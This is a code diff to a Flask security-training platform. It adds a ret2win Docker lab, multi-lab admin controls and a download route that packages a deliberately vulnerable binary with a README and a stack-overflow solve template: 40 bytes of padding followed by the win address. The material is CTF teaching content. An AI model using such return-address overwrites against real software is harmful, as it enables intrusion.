@@ -25,6 +25,24 @@ bp = Blueprint("main", __name__)
 ROOT_DIR = Path(__file__).resolve().parents[1]
 CTF_DIR = ROOT_DIR / "ctf_chall" / "ezsqli"
 XOR_CTF_DIR = ROOT_DIR / "ctf_chall" / "re_asm_xor_checker"
+PWN_CTF_DIR = ROOT_DIR / "ctf_chall" / "ret2win"
+
+CTF_LABS = [
+    {
+        "key": "ezsqli",
+        "name": "EzSQLi Docker Lab",
+        "description": "Web Exploitation challenge service",
+        "path": CTF_DIR,
+        "endpoint": os.environ.get("BYTESEC_CTF_URL", "http://127.0.0.1:8004"),
+    },
+    {
+        "key": "ret2win",
+        "name": "Ret2win Docker Lab",
+        "description": "Pwn challenge service",
+        "path": PWN_CTF_DIR,
+        "endpoint": os.environ.get("BYTESEC_PWN_CTF_ENDPOINT", "nc 127.0.0.1 9001"),
+    },
+]
 
 COURSE_TRACKS = [
     {
@@ -57,11 +75,22 @@ COURSE_TRACKS = [
         "order_start": 14,
         "order_end": 18,
     },
+    {
+        "key": "pwn",
+        "label": "[PWN]",
+        "title": "Pwn: Stack Exploitation",
+        "short_title": "Pwn",
+        "description": "Process memory, stack frames, buffer overflows, return-address control, exploit scripting, mitigations, and a ret2win Docker lab.",
+        "icon": "terminal",
+        "order_start": 19,
+        "order_end": 23,
+    },
 ]
 
 RSA_CHALLENGE_N = 1050042634739472048527415083734141614623526794604292789934035929043944753840232886771262298879903328617034311167949696362901721533840465932367411227174743302792364017856573114095054665590548643385179579641709628757228698065267663737
 RSA_CHALLENGE_E = 3
 RSA_CHALLENGE_C = 72240295003014461054855741550584414831200556784223014880653253099947072198594653539608891757481870490299217523710665832953564908965164440080453331341426135368723683931085590986597
+PWN_RET2WIN_FLAG_HASH = "8e7a8ab5ef6c8d0ffd605d16b6112704d0e493070046d4b382895fa722965587"
 
 
 # ── Helpers ──────────────────────────────────────────────────────────
@@ -225,8 +254,8 @@ def _learning_tracks():
             "title": "Pwn",
             "description": "Binary exploitation fundamentals, process memory, stack behavior, and dockerized practice targets.",
             "icon": "terminal",
-            "status": "Planned",
-            "status_class": "bg-surface-container text-on-surface-variant",
+            "status": "Live",
+            "status_class": "bg-secondary-container text-on-secondary-container",
         },
         {
             "title": "Forensics",
@@ -708,11 +737,11 @@ def course(track_key=None):
     )
 
 
-def _docker_compose(args, timeout=45):
+def _docker_compose_for(lab, args, timeout=45):
     try:
         result = subprocess.run(
             ["docker", "compose", *args],
-            cwd=CTF_DIR,
+            cwd=lab["path"],
             capture_output=True,
             text=True,
             timeout=timeout,
@@ -727,6 +756,16 @@ def _docker_compose(args, timeout=45):
     return {"ok": result.returncode == 0, "output": output or "Command completed."}
 
 
+def _docker_compose_all(args, timeout=45):
+    ok = True
+    output = []
+    for lab in CTF_LABS:
+        result = _docker_compose_for(lab, args, timeout=timeout)
+        ok = ok and result["ok"]
+        output.append(f"== {lab['name']} ==\n{result['output']}")
+    return {"ok": ok, "output": "\n\n".join(output)}
+
+
 @bp.route("/admin/docker", methods=["GET", "POST"])
 @admin_required
 def admin_docker():
@@ -736,22 +775,22 @@ def admin_docker():
         commands = {
             "start": ["up", "-d", "--build"],
             "stop": ["down"],
-            "restart": ["restart"],
+            "restart": ["up", "-d", "--build", "--force-recreate"],
         }
         if action in commands:
-            action_result = _docker_compose(commands[action], timeout=90)
+            action_result = _docker_compose_all(commands[action], timeout=120)
             flash(
-                f"Docker {action} {'completed' if action_result['ok'] else 'failed'}.",
+                f"Docker lab {action} {'completed' if action_result['ok'] else 'failed'}.",
                 "success" if action_result["ok"] else "danger",
             )
         else:
             flash("Unknown Docker action.", "danger")
 
-    status = _docker_compose(["ps"], timeout=20)
-    logs = _docker_compose(["logs", "--tail=80"], timeout=20)
+    status = _docker_compose_all(["ps"], timeout=30)
+    logs = _docker_compose_all(["logs", "--tail=80"], timeout=30)
     return render_template(
         "admin_docker.html",
-        ctf_url=os.environ.get("BYTESEC_CTF_URL", "http://127.0.0.1:8004"),
+        ctf_labs=CTF_LABS,
         status=status,
         logs=logs,
         action_result=action_result,
@@ -869,6 +908,100 @@ def download_crypto_rsa_starter():
         mimetype="application/zip",
         as_attachment=True,
         download_name="bytesec-crypto-rsa-starter.zip",
+    )
+
+
+def _build_ret2win_binary():
+    binary_path = PWN_CTF_DIR / "ret2win"
+    if binary_path.exists():
+        return binary_path, None
+    build = subprocess.run(
+        ["make"],
+        cwd=PWN_CTF_DIR,
+        capture_output=True,
+        text=True,
+        timeout=20,
+        check=False,
+    )
+    if build.returncode != 0 or not binary_path.exists():
+        output = "\n".join(part for part in (build.stdout.strip(), build.stderr.strip()) if part)
+        return None, output or "Build failed."
+    return binary_path, None
+
+
+def _binary_symbol_address(binary_path, symbol):
+    try:
+        result = subprocess.run(
+            ["nm", "-n", str(binary_path)],
+            capture_output=True,
+            text=True,
+            timeout=5,
+            check=False,
+        )
+    except (FileNotFoundError, subprocess.TimeoutExpired):
+        return None
+    if result.returncode != 0:
+        return None
+    for line in result.stdout.splitlines():
+        parts = line.split()
+        if len(parts) == 3 and parts[2] == symbol:
+            return int(parts[0], 16)
+    return None
+
+
+@bp.route("/downloads/pwn-ret2win")
+@login_required
+def download_pwn_ret2win():
+    binary_path, error = _build_ret2win_binary()
+    if error or binary_path is None:
+        return (
+            "The ret2win artifact is not available yet. "
+            "Ask the instructor to rebuild the challenge artifact."
+        ), 503
+
+    win_address = _binary_symbol_address(binary_path, "win")
+    win_line = f"WIN = 0x{win_address:x}" if win_address is not None else "WIN = 0x401176  # update with: nm -n ret2win | grep ' win'"
+    solve_template = (
+        "import struct\n"
+        "import sys\n"
+        "\n"
+        "# Offset for this training binary: 32-byte buffer + saved RBP.\n"
+        "OFFSET = 40\n"
+        f"{win_line}\n"
+        "\n"
+        "payload = b'A' * OFFSET + struct.pack('<Q', WIN)\n"
+        "sys.stdout.buffer.write(payload + b'\\n')\n"
+    )
+    readme = (
+        "ByteSec Pwn: Ret2win Starter\n"
+        "\n"
+        "Goal: redirect execution to the hidden win function and submit the flag.\n"
+        "\n"
+        "Suggested workflow:\n"
+        "  file ./ret2win\n"
+        "  checksec --file=./ret2win\n"
+        "  nm -n ./ret2win | grep ' win'\n"
+        "  python3 solve_template.py > payload.bin\n"
+        "  ./ret2win < payload.bin\n"
+        "\n"
+        "The Docker lab exposes the same target over TCP.\n"
+    )
+
+    archive = io.BytesIO()
+    with zipfile.ZipFile(archive, "w", compression=zipfile.ZIP_DEFLATED) as zf:
+        info = zipfile.ZipInfo("ret2win")
+        info.external_attr = 0o755 << 16
+        info.compress_type = zipfile.ZIP_DEFLATED
+        zf.writestr(info, binary_path.read_bytes())
+        zf.writestr("README.txt", readme)
+        zf.writestr("solve_template.py", solve_template)
+    archive.seek(0)
+
+    return send_file(
+        archive,
+        mimetype="application/zip",
+        as_attachment=True,
+        download_name="bytesec-pwn-ret2win.zip",
     )
 
 
